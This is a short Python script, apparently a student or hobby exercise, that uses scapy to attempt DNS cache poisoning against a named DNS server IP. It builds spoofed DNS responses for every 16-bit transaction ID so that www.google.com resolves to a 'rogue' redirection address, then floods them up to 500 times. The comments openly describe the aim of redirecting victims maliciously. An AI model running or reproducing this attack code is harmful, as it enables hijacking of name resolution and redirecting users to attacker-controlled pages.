from scapy.all import * #scapy library used to construct the packets and send them.
import time#time library to sleep.
sourceIP = '192.168.1.106'#IP of the machine that launches the attack.
destIP = '82.212.80.82'#IP of the DNS Server we want to cache poison.
destPort = 53#Destination port of the DNS Server we want to cache poison.
sourcePort = 5353#Source port of the machine that launches the attack
spoofing_set = list(range(0,65536))# 16 bit Transaction id so it ranges from 0-65535
victim_host_name = 'www.google.com'#Domain name that will be our 'trap', i.e when our victim types this in the address bar it will maliciously #redirect them to our rogueIP.
rogueIP = '150.140.130.170'#redirection page ip.
udp_packets = []#list that contains all of our mallicious packets.

for dns_trans_id in spoofing_set:#here we construct the mallicious packets.
	udp_packet = (IP(src=sourceIP,dst=destIP)
	/UDP(sport=sourcePort,dport=destPort)
	/DNS(id=dns_trans_id,rd=0,qr=1,ra=0,z=0,rcode=0,
	qdcount=0,ancount=0,nscount=0,arcount=0,
	qd=DNSRR(rrname=victim_host_name,rdata=rogueIP,
	type="A",rclass="IN"
	)))
	udp_packets.append(udp_packet)#add constructed packet to the list.
interval = 0.001#time interval. 
repeats = 500#maximum attempts before aborting.
attempt = 0#attempt counter.
while(attempt<repeats):
	sr(udp_packets)#send packet and listen for answer.
	time.sleep(interval)#sleep for interval seconds.
	attempt = attempt + 1#go to attempt 2.
